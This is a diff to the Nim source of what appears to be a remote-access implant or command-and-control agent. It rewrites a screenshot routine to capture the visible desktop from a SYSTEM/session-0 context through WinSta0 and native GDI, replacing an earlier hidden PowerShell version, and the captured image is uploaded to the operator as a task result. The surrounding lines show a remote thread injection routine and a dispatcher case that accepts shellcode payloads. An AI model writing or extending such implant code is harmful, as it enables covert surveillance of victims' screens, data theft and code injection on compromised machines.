@@ -36,18 +36,77 @@ proc extractFilename(path: string): string =
 
 const THREAD_SET_CONTEXT_FLAG: DWORD = 0x0010
 
-# ── Screenshot (PowerShell GDI) ───────────────────────────────────────────────
+# ── Screenshot (native GDI, WinSta0 — works from session 0 / SYSTEM) ──────────
+import winim/inc/wingdi
+
 proc doScreenshot(): seq[byte] =
-  let ps = "Add-Type -Assembly System.Windows.Forms,System.Drawing;" &
-    "$b=[Drawing.Bitmap]::new([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width," &
-    "[Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);" &
-    "$g=[Drawing.Graphics]::FromImage($b);$g.CopyFromScreen(0,0,0,0,$b.Size);" &
-    "$ms=[IO.MemoryStream]::new();$b.Save($ms,'Png');" &
-    "[Convert]::ToBase64String($ms.ToArray())"
-  let (outp, code) = execCmdEx("powershell.exe -NoP -NonI -W Hidden -C \"" & ps & "\"")
-  if code != 0: return @[]
-  try: return cast[seq[byte]](decode(outp.strip()))
-  except: return @[]
+  # Switch to interactive window station so GetDC captures the visible desktop
+  let hOrigSta = GetProcessWindowStation()
+  let deskAccess: ACCESS_MASK = DESKTOP_READOBJECTS or DESKTOP_CREATEWINDOW or
+      DESKTOP_CREATEMENU or DESKTOP_HOOKCONTROL or DESKTOP_JOURNALRECORD or
+      DESKTOP_JOURNALPLAYBACK or DESKTOP_ENUMERATE or DESKTOP_WRITEOBJECTS or
+      DESKTOP_SWITCHDESKTOP or READ_CONTROL
+  let hSta = OpenWindowStationA("WinSta0", 0, WINSTA_ALL_ACCESS or READ_CONTROL)
+  if hSta != 0: discard SetProcessWindowStation(hSta)
+  let hOrigDesk = GetThreadDesktop(GetCurrentThreadId())
+  let hDesk = OpenDesktopA("Default", 0, 0, deskAccess)
+  if hDesk != 0: discard SetThreadDesktop(hDesk)
+
+  let hDC = GetDC(0)
+  let sw = GetSystemMetrics(SM_CXSCREEN)
+  let sh = GetSystemMetrics(SM_CYSCREEN)
+  let hMemDC = CreateCompatibleDC(hDC)
+  let hBmp = CreateCompatibleBitmap(hDC, sw, sh)
+  let hOld = SelectObject(hMemDC, cast[HGDIOBJ](hBmp))
+  discard BitBlt(hMemDC, 0, 0, sw, sh, hDC, 0, 0, SRCCOPY)
+  discard SelectObject(hMemDC, hOld)
+
+  # Build BMP in memory
+  var bmi: BITMAPINFO
+  bmi.bmiHeader.biSize = DWORD(sizeof(BITMAPINFOHEADER))
+  bmi.bmiHeader.biWidth = sw
+  bmi.bmiHeader.biHeight = sh
+  bmi.bmiHeader.biPlanes = 1
+  bmi.bmiHeader.biBitCount = 24
+  bmi.bmiHeader.biCompression = BI_RGB
+
+  let rowBytes = ((sw * 3 + 3) and (not 3))
+  let pixBytes = rowBytes * sh
+  var pixData = newSeq[byte](pixBytes)
+  discard GetDIBits(hDC, hBmp, 0, UINT(sh), addr pixData[0], addr bmi, DIB_RGB_COLORS)
+
+  discard DeleteObject(cast[HGDIOBJ](hBmp))
+  discard DeleteDC(hMemDC)
+  discard ReleaseDC(0, hDC)
+
+  if hDesk != 0:
+    discard SetThreadDesktop(hOrigDesk)
+    discard CloseDesktop(hDesk)
+  if hSta != 0:
+    discard SetProcessWindowStation(hOrigSta)
+    discard CloseWindowStation(hSta)
+
+  if pixBytes == 0: return @[]
+
+  # Assemble BMP file: BITMAPFILEHEADER + BITMAPINFOHEADER + pixel data
+  let fileSize = 14 + sizeof(BITMAPINFOHEADER) + pixBytes
+  var bmp = newSeq[byte](fileSize)
+  # Signature 'BM'
+  bmp[0] = 0x42; bmp[1] = 0x4D
+  # File size (LE)
+  bmp[2] = byte(fileSize and 0xFF)
+  bmp[3] = byte((fileSize shr 8) and 0xFF)
+  bmp[4] = byte((fileSize shr 16) and 0xFF)
+  bmp[5] = byte((fileSize shr 24) and 0xFF)
+  # Reserved
+  bmp[6] = 0; bmp[7] = 0; bmp[8] = 0; bmp[9] = 0
+  # Offset to pixel data = 14 + 40 = 54
+  bmp[10] = 54; bmp[11] = 0; bmp[12] = 0; bmp[13] = 0
+  # Copy BITMAPINFOHEADER
+  copyMem(addr bmp[14], addr bmi.bmiHeader, sizeof(BITMAPINFOHEADER))
+  # Copy pixel data
+  copyMem(addr bmp[14 + sizeof(BITMAPINFOHEADER)], addr pixData[0], pixBytes)
+  return bmp
 
 # ── Remote thread injection ───────────────────────────────────────────────────
 proc doInjectRemote(pid: int; sc: seq[byte]): string =
@@ -270,7 +329,7 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
     if data.len == 0:
       t.sendResult(id, "", "screenshot failed")
     else:
-      t.uploadFile(id, "screenshot.png", data)
+      t.uploadFile(id, "screenshot.bmp", data)
       t.sendResult(id, "[+] screenshot captured (" & $data.len & " bytes)", "")
   of "INJECT_REMOTE":
     if payload.len == 0: t.sendResult(id, "", "no shellcode payload"); return
